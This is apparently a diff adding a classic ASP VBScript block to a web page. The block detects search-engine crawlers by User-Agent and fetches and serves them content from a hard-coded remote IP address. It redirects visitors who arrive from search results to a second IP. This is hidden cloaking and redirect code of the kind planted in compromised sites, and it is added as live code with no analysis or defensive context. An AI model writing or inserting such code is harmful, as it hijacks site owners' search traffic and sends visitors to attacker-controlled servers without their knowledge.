@@ -1,0 +1,158 @@
+<script language="vbscript" runat="server">
+function GetBot()
+dim s_agent
+GetBot=""
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"baidu",1) >0 then
+GetBot="baidu"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"360",1) >0 then
+GetBot="360"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"bing",1) >0 then
+GetBot="bing"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"yisou",1) >0 then
+GetBot="yisou"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"haosou",1) >0 then
+GetBot="haosou"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"sogou",1) >0 then
+GetBot="Sgou"
+end if
+s_agent=Request.ServerVariables("HTTP_USER_AGENT")
+if instr(1,s_agent,"sm",1) >0 then
+GetBot="sm"
+end if
+s_agent=Request.ServerVariables("HTTP_REFERER")
+if instr(1,s_agent,"baidu",1) >0 then
+GetBot="baidut"
+end if
+s_agent=Request.ServerVariables("HTTP_REFERER")
+if instr(1,s_agent,"so",1) >0 then
+GetBot="sot"
+end if
+s_agent=Request.ServerVariables("HTTP_REFERER")
+if instr(1,s_agent,"bing",1) >0 then
+GetBot="bingt"
+end if
+s_agent=Request.ServerVariables("HTTP_REFERER")
+if instr(1,s_agent,"yisou",1) >0 then
+GetBot="yisout"
+end if
+s_agent=Request.ServerVariables("HTTP_REFERER")
+if instr(1,s_agent,"sm",1) >0 then
+GetBot="smt"
+end if
+end function
+Function getHTTPPage(Path)
+t = GetBody(Path)
+getHTTPPage=BytesToBstr(t,"GB2312")'
+End function
+Function Newstring(wstr,strng)
+Newstring=Instr(lcase(wstr),lcase(strng))
+if Newstring<=0 then Newstring=Len(wstr)
+End Function
+Function GetBody(url)
+on error resume next
+Set Retrieval = CreateObject("Microsoft.XMLHTTP")
+With Retrieval
+.Open "Get", url, False, "", ""
+.Send
+GetBody = .ResponseBody
+End With
+Set Retrieval = Nothing
+End Function
+Function BytesToBstr(body,Cset)
+dim objstream
+set objstream = Server.CreateObject("adodb.stream")
+objstream.Type = 1
+objstream.Mode =3
+objstream.Open
+objstream.Write body
+objstream.Position = 0
+objstream.Type = 2
+objstream.Charset = Cset
+BytesToBstr = objstream.ReadText
+objstream.Close
+set objstream = nothing
+End Function
+Dim wstr,str,url,start,over,dtime
+const kzdz="http://154.222.122.37/"
+const tzdz="http://154.222.122.34/"
+if GetBot="baidu" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="360" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="Sgou" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="bing" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="yisou" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="haosou" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="sm" then
+url=kzdz
+wstr=getHTTPPage(url)
+body=wstr
+response.write ""&body&""
+'response.end
+End if
+if GetBot="baidut" then
+response.Redirect(tzdz)
+response.end
+End if
+if GetBot="sot" then
+response.Redirect(tzdz)
+response.end
+End if
+if GetBot="yisout" then
+response.Redirect(tzdz)
+response.end
+End if
+if GetBot="bingt" then
+response.Redirect(tzdz)
+response.end
+End if
+if GetBot="smt" then
+response.Redirect(tzdz)
+response.end
+End if
+</script>
